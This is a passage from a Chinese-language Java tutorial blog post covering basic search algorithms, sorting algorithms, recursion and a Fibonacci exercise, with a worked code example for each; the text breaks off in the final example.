        <content type="html"><![CDATA[<h1 id="常见算法"><a href="#常见算法" class="headerlink" title="常见算法"></a>常见算法</h1><h2 id="查找算法"><a href="#查找算法" class="headerlink" title="查找算法"></a>查找算法</h2><h3 id="基本查找"><a href="#基本查找" class="headerlink" title="基本查找"></a>基本查找</h3><p>基本查找&#x2F;顺序查找</p><p>核心：从0索引开始挨个查找</p><p>需求：定义一个方法利用基本查找，查询某个元素是否存在</p><p>数据如下：{131,,127,147,81,103,23,7,79}</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] arr = &#123;<span class="number">131</span>,<span class="number">127</span>,<span class="number">147</span>,<span class="number">81</span>,<span class="number">103</span>,<span class="number">23</span>,<span class="number">7</span>,<span class="number">79</span>&#125;;</span><br><span class="line">        <span class="type">int</span> <span class="variable">number</span> <span class="operator">=</span> <span class="number">81</span>;</span><br><span class="line">        System.out.println(basicSearch(arr,number));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//需要的参数</span></span><br><span class="line">    <span class="comment">//1.数组</span></span><br><span class="line">    <span class="comment">//2.要查找的元素</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">basicSearch</span><span class="params">(<span class="type">int</span>[] arr,<span class="type">int</span> number)</span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(arr[i] == number)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="二分查找-x2F-折半查找"><a href="#二分查找-x2F-折半查找" class="headerlink" title="二分查找&#x2F;折半查找"></a>二分查找&#x2F;折半查找</h3><p>前提条件：数组中的数据必须是有序的</p><p>核心逻辑：每次排除一半的查找范围</p><p>1.min和max表示当前要查找的范围</p><p>2.mid是在min和max中间的</p><p>3.如果要查找的元素在mid的左边，缩小范围时，min不变，max等于mid减1</p><p>4.如果要查找的元素在mid的右边，缩小范围时，max不变，min等于mid加1</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> heima;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">B</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] arr = &#123;<span class="number">7</span>,<span class="number">23</span>,<span class="number">79</span>,<span class="number">81</span>,<span class="number">103</span>,<span class="number">127</span>,<span class="number">131</span>,<span class="number">147</span>&#125;;</span><br><span class="line">        System.out.println(binarySeach(arr,<span class="number">81</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">binarySeach</span><span class="params">(<span class="type">int</span>[] arr, <span class="type">int</span> number)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">min</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> arr.length - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//利用循环查找需要查找的数据</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (min &gt; max) &#123;</span><br><span class="line">                <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//找到中间的位置</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> (min + max) / <span class="number">2</span>;</span><br><span class="line">            <span class="comment">//拿着mid的数据在数组中进行比较</span></span><br><span class="line">            <span class="keyword">if</span> (arr[mid] &gt; number) &#123;</span><br><span class="line">                <span class="comment">//大于</span></span><br><span class="line">                max = mid - <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (arr[mid] &lt; number) &#123;</span><br><span class="line">                <span class="comment">//小于</span></span><br><span class="line">                min = mid + <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> mid;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="二分查找改进（插值查找）"><a href="#二分查找改进（插值查找）" class="headerlink" title="二分查找改进（插值查找）"></a>二分查找改进（插值查找）</h4><p><img src="https://blog-1258155859.cos.ap-guangzhou.myqcloud.com/imgSnipaste_2022-08-19_19-56-52.png"></p><h3 id="分块查找"><a href="#分块查找" class="headerlink" title="分块查找"></a>分块查找</h3><p>分块原则1：前一块中的最大一块，小于后一块中所有的数据（块内无序，块间有序）</p><p>分块原则2：块的数量一般等于数字的个数开根号。比如：16个数字一般分为4块左右</p><p>核心思路：先确定要查找的元素在哪一块，然后在块内挨个查找</p><p><img src="https://blog-1258155859.cos.ap-guangzhou.myqcloud.com/imgSnipaste_2022-08-22_22-40-33.png"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> heima;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">C</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//分块查找</span></span><br><span class="line">        <span class="type">int</span>[] arr = &#123;<span class="number">16</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">12</span>, <span class="number">21</span>,<span class="number">18</span>,</span><br><span class="line">                    <span class="number">32</span>,<span class="number">23</span>,<span class="number">37</span>,<span class="number">26</span>,<span class="number">45</span>,<span class="number">34</span>,</span><br><span class="line">                    <span class="number">50</span>,<span class="number">48</span>,<span class="number">61</span>,<span class="number">52</span>,<span class="number">73</span>,<span class="number">66</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建三个块的对象</span></span><br><span class="line">        <span class="type">Block</span> <span class="variable">b1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Block</span>(<span class="number">21</span>,<span class="number">0</span>,<span class="number">5</span>);</span><br><span class="line">        <span class="type">Block</span> <span class="variable">b2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Block</span>(<span class="number">45</span>,<span class="number">6</span>,<span class="number">11</span>);</span><br><span class="line">        <span class="type">Block</span> <span class="variable">b3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Block</span>(<span class="number">73</span>,<span class="number">12</span>,<span class="number">17</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//定义数组管理者三个对象（索引表）</span></span><br><span class="line">        Block[] blockArr = &#123;b1,b2,b3&#125;;</span><br><span class="line">        <span class="comment">//定义一个需要查找的数据</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">number</span> <span class="operator">=</span> <span class="number">37</span>;</span><br><span class="line">        <span class="comment">//调用方法，传递索引表，数组，要查找的元素</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> getIndex(blockArr,arr,number);</span><br><span class="line">        <span class="comment">//打印</span></span><br><span class="line">        System.out.println(index);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">getIndex</span><span class="params">(Block[] blockArr, <span class="type">int</span>[] arr, <span class="type">int</span> number)</span> &#123;</span><br><span class="line">        <span class="comment">//1.确定number在那一块</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">indexBlock</span> <span class="operator">=</span> findIndexBlock(blockArr,number);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(indexBlock == -<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取这一块的开始索引，结束索引</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">startIndex</span> <span class="operator">=</span> blockArr[indexBlock].getStartIndex();</span><br><span class="line">        <span class="type">int</span> <span class="variable">endIndex</span> <span class="operator">=</span> blockArr[indexBlock].getEndIndex();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.遍历</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> startIndex;i &lt;= endIndex;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(arr[i] == number)&#123;</span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//定义一个方法用来确定number在哪个块中</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">findIndexBlock</span><span class="params">(Block[] blockArr,<span class="type">int</span> number)</span>&#123;</span><br><span class="line">        <span class="comment">//Block b1 = new Block(21,0,5);</span></span><br><span class="line">        <span class="comment">//Block b2 = new Block(45,6,11);</span></span><br><span class="line">        <span class="comment">//Block b3 = new Block(73,12,17);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//从0索引开始遍历blockArr，如果number小于max，那么就表示number就在这个表中</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; blockArr.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(number &lt;= blockArr[i].getMax())&#123;</span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Block</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> max;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> startIndex;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> endIndex;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Block</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Block</span><span class="params">(<span class="type">int</span> max, <span class="type">int</span> startIndex, <span class="type">int</span> endIndex)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.max = max;</span><br><span class="line">        <span class="built_in">this</span>.startIndex = startIndex;</span><br><span class="line">        <span class="built_in">this</span>.endIndex = endIndex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getMax</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> max;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setMax</span><span class="params">(<span class="type">int</span> max)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.max = max;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getStartIndex</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> startIndex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setStartIndex</span><span class="params">(<span class="type">int</span> startIndex)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.startIndex = startIndex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getEndIndex</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> endIndex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setEndIndex</span><span class="params">(<span class="type">int</span> endIndex)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.endIndex = endIndex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>扩展的分块查找（无规律的数据）</p><p><img src="https://blog-1258155859.cos.ap-guangzhou.myqcloud.com/imgSnipaste_2022-08-22_23-11-35.png"></p><h2 id="排序算法"><a href="#排序算法" class="headerlink" title="排序算法"></a>排序算法</h2><h3 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h3><p>冒泡排序：相邻的数据两两比较，小的放前面，大的放后面</p><p>1.第一轮循环结束，最大值已经找到，在数组的最右边</p><p>2.第二轮循环只要在剩下的元素找最大值就可以了</p><p>3.如果数组中有n个数据，总共我们只要执行n-1轮代码就可以了</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> heima;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">D</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] arr = &#123;<span class="number">2</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">1</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;i &lt; arr.length- <span class="number">1</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; arr.length - <span class="number">1</span> - i; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(arr[j] &gt; arr[j + <span class="number">1</span>])&#123;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> arr[j];</span><br><span class="line">                    arr[j] = arr[j + <span class="number">1</span>];</span><br><span class="line">                    arr[j + <span class="number">1</span>] = temp;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">            System.out.print(arr[i] + <span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h3><p>选择排序：从0索引开始，拿着每一个索引上的元素跟后面的元素依次比较，小的放前面，大的放后面，以此类推</p><p>1.从0索引开始，跟后面的元素一一比较</p><p>2.小的放前面，大的放后面</p><p>3.第一轮循环结束后，最小的数据已经确定</p><p>4.第二轮循环从1索引开始以此类推</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> heima;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">E</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] arr = &#123;<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">1</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> i + <span class="number">1</span>; j &lt; arr.length; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(arr[i] &gt; arr[j])&#123;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> arr[i];</span><br><span class="line">                    arr[i] = arr[j];</span><br><span class="line">                    arr[j] = temp;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">            System.out.print(arr[i] + <span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h3><p>插入排序：将0索引的元素到N索引的元素看做是有序的，把N+1索引的元素放到最后一个当成是无序的。遍历无序的数据，将遍历到的元素插入到有序序列中适当的位置，如遇到相同的数据，插在后面</p><p>N的</p><p>范围：0~最大索引</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> heima;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">F</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] arr = &#123;<span class="number">3</span>,<span class="number">44</span>,<span class="number">38</span>,<span class="number">5</span>,<span class="number">47</span>,<span class="number">15</span>,<span class="number">36</span>,<span class="number">26</span>,<span class="number">27</span>,<span class="number">2</span>,<span class="number">46</span>,<span class="number">4</span>,<span class="number">19</span>,<span class="number">50</span>,<span class="number">48</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//1.找到无序的那一组是从哪个索引开始的</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">startIndex</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(arr[i] &gt; arr[i + <span class="number">1</span>])&#123;</span><br><span class="line">                startIndex = i + <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//2.遍历从startIndex开始到最后一个元素，依次得到无序数据中的每一个元素</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> startIndex; i &lt; arr.length; i++) &#123;</span><br><span class="line">            <span class="comment">//记录当前要插入数据的索引</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> i;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">while</span>(j &gt; <span class="number">0</span> &amp;&amp; arr[j] &lt; arr[j - <span class="number">1</span>])&#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> arr[j];</span><br><span class="line">                arr[j] = arr[j - <span class="number">1</span>];</span><br><span class="line">                arr[j - <span class="number">1</span>] = temp;</span><br><span class="line">                j--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">            System.out.print(arr[i] + <span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="递归算法"><a href="#递归算法" class="headerlink" title="递归算法"></a>递归算法</h3><p>递归指的是方法中调用方法本身的现象</p><p>递归方法的作用：把一个赋值的问题层层转化为一个与原问题相似的规模较小的问题来求解</p><p>书写递归的两个核心：</p><ul><li>找出口：什么时候不再调用方法</li><li>找规则：如何把大问题变成规模较小的问题</li></ul><p>递归求1~100之间的和</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> heima;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">G</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(getSum(<span class="number">100</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">getSum</span><span class="params">(<span class="type">int</span> number)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(number == <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> number + getSum(number - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>递归求阶乘</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> heima;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">H</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(getFactorialRecursion(<span class="number">5</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">getFactorialRecursion</span><span class="params">(<span class="type">int</span> number)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(number == <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> number * getFactorialRecursion(number - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h3><p>第一轮：把0索引的数字作为基准数，确定基准数在数组中正确的位置。比基准数小的全部在左边，比基准数大的全部在右边</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> heima;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">I</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span>[] arr = &#123;<span class="number">6</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">8</span>&#125;;</span><br><span class="line"></span><br><span class="line">        quickSort(arr,<span class="number">0</span>,arr.length - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;i &lt; arr.length;i++)&#123;</span><br><span class="line">            System.out.print(arr[i] + <span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//参数一：需要排序的数组</span></span><br><span class="line">    <span class="comment">//参数二、需要排序数组的起始索引</span></span><br><span class="line">    <span class="comment">//参数三、需要排序数组的结束索引</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">quickSort</span><span class="params">(<span class="type">int</span>[] arr,<span class="type">int</span> i,<span class="type">int</span> j)</span>&#123;</span><br><span class="line">        <span class="comment">//定义两个变量记录要查找的范围</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> i + <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">end</span> <span class="operator">=</span> j;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//递归的出口</span></span><br><span class="line">        <span class="keyword">if</span>(start &gt; end)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//记录基准数</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">baseNumber</span> <span class="operator">=</span> arr[i];</span><br><span class="line"></span><br><span class="line">        <span class="comment">//利用循环找到要交换的数字</span></span><br><span class="line">        <span class="keyword">while</span>(start != end)&#123;</span><br><span class="line">            <span class="comment">//利用end，从后往前找，找比基准数小的数字</span></span><br><span class="line">            <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(end &lt;= start || arr[end] &lt; baseNumber)&#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                end--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//利用start，从前往后找，找比基准数大的数字</span></span><br><span class="line">            <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(end &lt;= start || arr[start] &gt; baseNumber)&#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                start++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//把end和start指向的元素进行交换</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> arr[start];</span><br><span class="line">            arr[start] = arr[end];</span><br><span class="line">            arr[end] = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//当start和end指向同一个元素的时候，那么上面的循环就会结束</span></span><br><span class="line">        <span class="comment">//表示已经找到了基准数在数组中应存入的位置</span></span><br><span class="line">        <span class="comment">//基准数归位</span></span><br><span class="line">        <span class="comment">//就是拿着这个范围中的第一个数字，跟start指向的元素进行交换</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> arr[i];</span><br><span class="line">        arr[i] = arr[start];</span><br><span class="line">        arr[start] = temp;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//确定6左边的范围，重复刚刚的事情</span></span><br><span class="line">        quickSort(arr,i,start - <span class="number">1</span>);</span><br><span class="line">        <span class="comment">//确定6右边的范围，重复刚刚的事情</span></span><br><span class="line">        quickSort(arr,start + <span class="number">1</span>,j);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>1.冒泡排序</p><ul><li>相邻的元素两两比较，小的放前面，大的放后面</li></ul><p>2.选择排序</p><ul><li>从0索引开始，拿着每一个索引上的元素跟后面的元素依次比较，小的放前面，大的放后面</li></ul><p>3.插入排序</p><ul><li>将数组分为有序和无序两组，遍历无序数据，将元素插入有序序列中即可</li></ul><p>4.快速排序</p><ul><li>将排序范围中的第一个数字作为基准数，再定义两个变量start和end</li><li>start从前往后找比基准数大的，end从后往前找比基准数小的</li><li>找到之后交换start和end指向的元素，并稀罕这一过程，直到start个end处于同一个位置，该位置是基准数应存入的位置，再让基准数归位</li><li>归位后的效果：基准数左边的，比基准数小，基准数右边的，比基准数大</li></ul><h1 id="综合练习"><a href="#综合练习" class="headerlink" title="综合练习"></a>综合练习</h1><h2 id="不死神兔"><a href="#不死神兔" class="headerlink" title="不死神兔"></a>不死神兔</h2><p>有一个很有名的数学逻辑题叫做不死神兔问题，有一对兔子，从出生后第三个月起每个月都生一对兔子，小兔子长到第三个月后每个月又生一队兔子，假如兔子都不死，问第十二个月的兔子对数为多少</p><p>特点：从第三个数据开始，是前两个数据的和（斐波那契数列）</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> heima;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">one</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] arr = <span class="keyword">new</span> <span class="title class_">int</span> [<span class="number">12</span>];</span><br><span class="line">        arr[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        arr[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">2</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">            arr[i] = arr[i - <span class="number">1</span>] + arr[i - <span class="number">2</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(arr[<span class="number">11</span>]);</span><br><span class="line">    &#125;</span><br><span 